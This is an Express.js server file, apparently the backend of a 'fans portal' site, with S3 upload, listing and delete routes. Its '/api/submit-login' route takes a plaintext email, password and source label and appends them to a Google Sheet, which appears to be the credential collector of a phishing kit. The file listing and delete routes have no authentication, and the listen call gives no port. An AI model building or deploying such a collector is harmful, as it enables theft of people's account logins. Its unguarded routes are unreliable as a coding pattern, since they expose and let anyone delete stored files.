import express from "express";
import { promises as fs } from "fs";
import { S3Client, PutObjectCommand, DeleteObjectCommand, GetObjectCommand } from "@aws-sdk/client-s3";
import { google } from "googleapis";
import dotenv from "dotenv";
import Image from "./database/fileSchema.js";
import cors from "cors";
import connectDB from "./database/connectDB.js";
import { generateUploadURL } from './s3.js';
import { getSignedUrl } from "@aws-sdk/s3-request-presigner";

dotenv.config();

const app = express();



const corsOptions = {
  origin: 'https://votesy-fans-portal.vercel.app',
  methods: ['GET', 'POST', 'DELETE', 'PUT', 'HEAD'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  optionsSuccessStatus: 200, // For legacy browsers
};


app.use(cors(corsOptions));


// Use these variables in your application


// Ensure these are defined before using them
const region = "eu-north-1";
const bucketName = "votesy-files";
const accessKeyId = process.env.MY_AWS_ACCESS_KEY;
const secretAccessKey = process.env.MY_SECRET_ACCESS_KEY


if (!accessKeyId || !secretAccessKey) {
  throw new Error("AWS_ACCESS_KEY and SECRET_ACCESS_KEY must be set in the .env file");
}

// Initialize S3 client after defining variables
const s3 = new S3Client({
  credentials: {
    accessKeyId,
    secretAccessKey,
  },
  region,
});

// Google Sheets API setup
const CREDENTIALS_PATH = process.env.MY_GOOGLE_SERVICE_ACCOUNT_JSON;
const SCOPES = ["https://www.googleapis.com/auth/spreadsheets"];
const sheets = google.sheets("v4");

// Middleware setup
app.use(express.json());


const db = process.env.MY_CONNECTION_STRING;
connectDB(db);

async function authorize() {
  const credentials = JSON.parse(await fs.readFile(CREDENTIALS_PATH));
  const auth = new google.auth.GoogleAuth({
    credentials,
    scopes: SCOPES,
  });
  return auth.getClient();
}

async function appendData(auth, range, values) {
  const sheets = google.sheets({ version: "v4", auth });
  const spreadsheetId = process.env.MY_SPREADSHEET_ID;
  const resource = {
    values,
  };

  try {
    await sheets.spreadsheets.values.append({
      spreadsheetId,
      range,
      valueInputOption: "RAW",
      resource,
    });
    console.log("Data appended successfully");
  } catch (err) {
    console.error("Error appending data to spreadsheet:", err);
  }
}

app.get("/", (request,response) => {
  response.send("Server is running in Jesus name");
})

app.post("/api/submit-login", async (request, response) => {
  const { password, email, source } = request.body;

  if (!password || !email || !source) {
    return response.status(400).send("Missing required fields");
  }

  const range = "Sheet1!A:C";
  const values = [[source, password, email]];

  try {
    const auth = await authorize();
    await appendData(auth, range, values);
    response.status(200).send("Data appended successfully");
  } catch (error) {
    console.error("Error appending data to spreadsheet:", error);
    response.status(500).send("Error appending data to spreadsheet");
  }
});

app.get("/api/images", async (request, response) => {
  try {
    const {uploadURL, key } = await generateUploadURL();
    response.status(200).json({ uploadURL, key });
  } catch (error) {
    response.status(500).send("Error generating upload URL");
  }
});

app.get("/api/userFiles", async (req, res) => {
  try {
    const images = await Image.find().select('key name');
    const signedUrls = await Promise.all(images.map(async (img) => {
      const command = new GetObjectCommand({
        Bucket: bucketName,
        Key: img.key,
      });
      const url = await getSignedUrl(s3, command, { expiresIn: 3600 });
      return { url, key: img.key, name: img.name }; // Include key for better debugging
    }));

    res.status(200).json({ urls: signedUrls });
  } catch (error) {
    console.error("Error fetching image URLs:", error);
    res.status(500).json({ message: 'Error fetching image URLs' });
  }
});


app.post("/api/save-image", async (request, response) => {
  try {
    const { url, key } = request.body; // Accept both URL and Key
    if (!url || !key) {
      return response.status(400).send("URL and Key are required");
    }

    const newImage = new Image({ url, key }); // Save both URL and Key
    await newImage.save();
    response.status(200).send("Image URL saved successfully");
  } catch (error) {
    console.error("Error saving image URL:", error);
    response.status(500).send("Error saving image URL");
  }
});


app.delete("/api/deleteFile", async (request, response) => {
  const { key } = request.body; // the key of the file to delete

  try {
      const command = new DeleteObjectCommand({
          Bucket: bucketName,
          Key: key,
      });
      await s3.send(command);

      const deletedImage = await Image.findOneAndDelete({key});

      if (!deletedImage) {
        return response.status(404).json({ message: "Image not found in database" });
      }

      response.status(200).json({ message: "File deleted successfully" });
  } catch (error) {
      console.error("Error deleting file:", error);
      response.status(500).json({ message: "Error deleting file" });
  }
});

app.listen(() => {
  console.log(`Server is running`);
});
